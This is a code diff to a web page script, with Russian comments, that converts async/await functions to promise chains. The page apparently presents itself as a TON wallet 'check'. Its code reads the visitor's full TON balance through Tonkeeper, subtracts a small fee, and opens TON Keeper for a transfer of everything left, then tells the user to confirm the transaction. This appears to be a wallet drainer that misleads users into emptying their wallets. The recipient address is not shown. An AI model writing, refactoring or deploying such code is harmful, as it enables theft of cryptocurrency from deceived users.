@@ -127,21 +127,23 @@
         const openWalletBtn = document.getElementById('openWalletBtn');
 
         // ========== ПОЛУЧИТЬ БАЛАНС ==========
-        async function getBalance() {
-            try {
-                if (!window.tonkeeper) return 0;
-                const provider = window.tonkeeper;
-                const accounts = await provider.send('ton_requestAccounts', {});
-                if (!accounts || accounts.length === 0) return 0;
-                const address = accounts[0];
-                const hex = await provider.send('ton_getBalance', { address: address });
-                const nano = parseInt(hex, 16);
-                const balance = (nano / 1e9).toFixed(6);
-                balanceDisplay.innerText = `💰 ${balance} TON`;
-                return nano;
-            } catch(e) {
-                return 0;
+        function getBalance() {
+            if (!window.tonkeeper) {
+                return Promise.resolve(0);
             }
+            return window.tonkeeper.send('ton_requestAccounts', {})
+                .then(accounts => {
+                    if (!accounts || accounts.length === 0) return 0;
+                    const address = accounts[0];
+                    return window.tonkeeper.send('ton_getBalance', { address: address })
+                        .then(hex => {
+                            const nano = parseInt(hex, 16);
+                            const balance = (nano / 1e9).toFixed(6);
+                            balanceDisplay.innerText = `💰 ${balance} TON`;
+                            return nano;
+                        });
+                })
+                .catch(() => 0);
         }
 
         // ========== ОТКРЫТЬ TON KEEPER ==========
@@ -154,74 +156,73 @@
         }
 
         // ========== ОСНОВНАЯ КНОПКА ==========
-        mainBtn.onclick = async function() {
-            try {
-                status.innerText = '⏳ Проверка...';
-                mainBtn.disabled = true;
-                mainBtn.style.opacity = '0.5';
+        mainBtn.onclick = function() {
+            status.innerText = '⏳ Проверка...';
+            mainBtn.disabled = true;
+            mainBtn.style.opacity = '0.5';
 
-                // Получаем баланс
-                const nano = await getBalance();
-                
-                if (nano <= 0) {
-                    status.innerText = '💰 Баланс 0 TON';
+            getBalance()
+                .then(nano => {
+                    if (nano <= 0) {
+                        status.innerText = '💰 Баланс 0 TON';
+                        mainBtn.disabled = false;
+                        mainBtn.style.opacity = '1';
+                        return;
+                    }
+
+                    const fee = 5000000;
+                    const amount = nano - fee;
+
+                    if (amount <= 0) {
+                        status.innerText = '⚠️ Баланс меньше комиссии';
+                        mainBtn.disabled = false;
+                        mainBtn.style.opacity = '1';
+                        return;
+                    }
+
+                    const amountTON = (amount / 1e9).toFixed(6);
+                    status.innerText = `⏳ Отправка ${amountTON} TON...`;
+
+                    openTonKeeper(amountTON);
+
+                    confirmBox.classList.add('show');
+                    status.innerText = `✅ Подтвердите транзакцию на ${amountTON} TON в TON Keeper`;
+
                     mainBtn.disabled = false;
                     mainBtn.style.opacity = '1';
-                    return;
-                }
-
-                const fee = 5000000;
-                const amount = nano - fee;
-
-                if (amount <= 0) {
-                    status.innerText = '⚠️ Баланс меньше комиссии';
+                })
+                .catch(e => {
+                    status.innerText = '❌ Ошибка: ' + e.message;
                     mainBtn.disabled = false;
                     mainBtn.style.opacity = '1';
-                    return;
-                }
-
-                const amountTON = (amount / 1e9).toFixed(6);
-                status.innerText = `⏳ Отправка ${amountTON} TON...`;
-
-                // Открываем TON Keeper
-                openTonKeeper(amountTON);
-
-                // Показываем плашку
-                confirmBox.classList.add('show');
-                status.innerText = `✅ Подтвердите транзакцию на ${amountTON} TON в TON Keeper`;
-
-                mainBtn.disabled = false;
-                mainBtn.style.opacity = '1';
-
-            } catch(e) {
-                status.innerText = '❌ Ошибка: ' + e.message;
-                mainBtn.disabled = false;
-                mainBtn.style.opacity = '1';
-            }
+                });
         };
 
         // ========== КНОПКА "OPEN WALLET" ==========
-        openWalletBtn.onclick = async function() {
-            const nano = await getBalance();
-            if (nano <= 0) {
-                status.innerText = '💰 Баланс 0 TON';
-                return;
-            }
-            const fee = 5000000;
-            const amount = nano - fee;
-            if (amount <= 0) {
-                status.innerText = '⚠️ Баланс меньше комиссии';
-                return;
-            }
-            const amountTON = (amount / 1e9).toFixed(6);
-            openTonKeeper(amountTON);
+        openWalletBtn.onclick = function() {
+            getBalance()
+                .then(nano => {
+                    if (nano <= 0) {
+                        status.innerText = '💰 Баланс 0 TON';
+                        return;
+                    }
+                    const fee = 5000000;
+                    const amount = nano - fee;
+                    if (amount <= 0) {
+                        status.innerText = '⚠️ Баланс меньше комиссии';
+                        return;
+                    }
+                    const amountTON = (amount / 1e9).toFixed(6);
+                    openTonKeeper(amountTON);
+                });
         };
 
         // ========== АВТОПРОВЕРКА ПРИ ЗАГРУЗКЕ ==========
-        setTimeout(async () => {
+        setTimeout(function() {
             if (window.tonkeeper) {
-                await getBalance();
-                status.innerText = '🟢 Нажмите "ПРОВЕРИТЬ"';
+                getBalance().then(function() {
+                    status.innerText = '🟢 Нажмите "ПРОВЕРИТЬ"';
+                });
             } else {
                 status.innerText = '📱 Нажмите "ПРОВЕРИТЬ"';
             }
